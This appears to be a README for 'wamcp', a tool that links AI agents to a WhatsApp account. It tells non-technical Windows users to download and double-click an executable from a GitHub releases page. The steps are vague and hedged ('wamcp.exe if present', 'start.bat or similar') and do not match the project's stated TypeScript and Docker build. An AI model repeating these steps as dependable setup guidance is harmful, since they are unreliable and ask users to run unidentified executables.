# 🤖 wamcp - Connect AI Agents to WhatsApp Easily

[![Download wamcp](https://img.shields.io/badge/Download-wamcp-brightgreen?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)

---

## 📱 What is wamcp?

wamcp stands for WhatsApp MCP Server. It lets you connect AI agents to WhatsApp. This means you can automate chats, send messages, and respond using AI tools. The server uses the Model Context Protocol (MCP) and supports popular WhatsApp interfaces like Baileys (WhatsApp Web) and the official Cloud API. It is built with solid technology like TypeScript, BullMQ for task handling, and Docker for easy setup.

You do not need to know coding to get started. This guide will help you download and run wamcp on Windows step-by-step.

---

## ⚙️ System Requirements

Before you start, make sure your computer meets these basic needs:

- **Operating System:** Windows 10 or later
- **Processor:** 64-bit CPU (Intel or AMD)
- **Memory:** At least 4 GB RAM
- **Storage:** At least 500 MB free space
- **Internet:** Required for setup and running the app
- **Additional Software:** Docker Desktop for Windows (free to install)

If you do not have Docker installed, this guide includes instructions to get it.

---

## 🛠️ Features of wamcp

wamcp gives you the following tools and options:

- Connect AI agents to WhatsApp for automated conversations
- Supports 61 AI tools and 10 different resources to customize your setup
- Handles 12 real-time events for message updates and status
- Works with Baileys (WhatsApp Web) and official WhatsApp Cloud API
- Built with reliable tech: TypeScript, BullMQ task queue, and Docker containers for easy deployment
- No programming needed to run or manage

These features make it a solid choice if you want to add AI-powered bots to your WhatsApp chats.

---

## 💾 How to Download wamcp

This section guides you on where to get the app.

### 1. Visit the Download Page

Click the button below to go to the wamcp release page on GitHub:

[![Download wamcp](https://img.shields.io/badge/Download-wamcp-blue?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)

The release page contains the latest versions of the app. Look for the most recent stable release at the top.

### 2. Choose the Correct File

On the release page:

- Find the file for Windows. It usually ends with `.exe`, `.zip`, or `.msi`.
- If you see a zipped file, download it and unzip it later.
- If you see a `.exe` file, you will run it directly.

---

## 📥 Installing wamcp on Windows

Follow these steps to install wamcp smoothly.

### 1. Download the Installer or Zip

- Go to the [release page](https://github.com/Lilsmur/wamcp/releases)
- Click the Windows installer or zip file for the latest version.
- Save it in a folder where you can find it easily, like your Desktop or Downloads folder.

### 2. If You Downloaded a Zip File

- Right-click the zip file.
- Select “Extract All...” and choose a folder to extract to.
- Remember this folder location for the next steps.

### 3. Install Docker Desktop (If Not Installed)

wamcp uses Docker to run smoothly.

- Visit https://www.docker.com/products/docker-desktop
- Download the Docker Desktop installer for Windows.
- Run the installer and follow prompts to finish.
- Once installed, open Docker Desktop and confirm it is running.

Docker lets wamcp run the necessary services reliably without you managing complicated setups.

### 4. Set Up wamcp

- Open the folder where you extracted or installed wamcp.
- Double-click the `wamcp.exe` file if present.
- If no `.exe` is found, look for a file named `start.bat` or similar and double-click it.

This launches the server and opens a command window. The server prepares itself and starts listening for WhatsApp connections.

---

## 🚀 Running wamcp for the First Time

### 1. Connect Your WhatsApp Account

wamcp lets you connect your WhatsApp through two methods:

- **Baileys (WhatsApp Web):** This uses a web QR code. You scan with your phone like WhatsApp Web. 
- **Cloud API:** A cloud-based official WhatsApp connection (for users with API access).

For most users, the Baileys method is easier.

### 2. Follow On-Screen Instructions

After starting wamcp:

- Look at the command window or web interface for a QR code.
- Open WhatsApp on your phone.
- Go to WhatsApp Web scanner and scan the QR code.

Once scanned, your WhatsApp connects to wamcp.

### 3. Start Using AI Agents

Once connected, wamcp will handle incoming and outgoing messages. Depending on your setup, AI agents will respond to messages automatically.

---

## 🔧 Tips for Using wamcp

- Keep your phone connected to the internet if using Baileys.
- Always update wamcp to the latest version for security and features.
- Review the real-time events in the interface to see how messages are processed.
- Use the official Cloud API if you want a more stable connection without needing your phone online.
- Refer to the `/tools` and `/resources` folders in the installation directory to explore additional AI tools.

---

## 🗂️ Files and Folders You Will See

- `/tools` – AI components and helpers
- `/resources` – Configuration and data files
- `/logs` – Server activity logs
- `wamcp.exe` or `start.bat` – Files to start the server
- `docker-compose.yml` – Docker setup file

You generally do not need to modify these unless customizing your setup.

---

## 🔄 Updating wamcp

To update wamcp in the future:

1. Go to the [release page again](https://github.com/Lilsmur/wamcp/releases).
2. Download the newest version.
3. Stop the current running server by closing its window.
4. Replace your old files with the new ones.
5. Restart wamcp following the running instructions.

---

## 📞 Getting Help

If you run into problems:

- Check the `logs` folder for error messages.
- Visit the GitHub Issues page under the repo to see if others have the same problem.
- Look for detailed notes or instructions on the GitHub repository page.
- Restart your computer and repeat the setup steps if connection errors occur.

The setup process is straightforward and made to run reliably on Windows.

---

## 🔗 Useful Links

- Download wamcp: https://github.com/Lilsmur/wamcp/releases  
- Docker Desktop for Windows: https://www.docker.com/products/docker-desktop  
- WhatsApp Web QR Scanner Info: https://faq.whatsapp.com/web  

---

## ⚠️ Security and Privacy

Using wamcp connects your WhatsApp account to third-party services. Only run on computers you trust. Keep your WhatsApp app and phone secure. Use official WhatsApp Cloud API if you need a safer method without scanning QR codes.

---

[![Download wamcp](https://img.shields.io/badge/Download-wamcp-green?style=for-the-badge)](https://github.com/Lilsmur/wamcp/releases)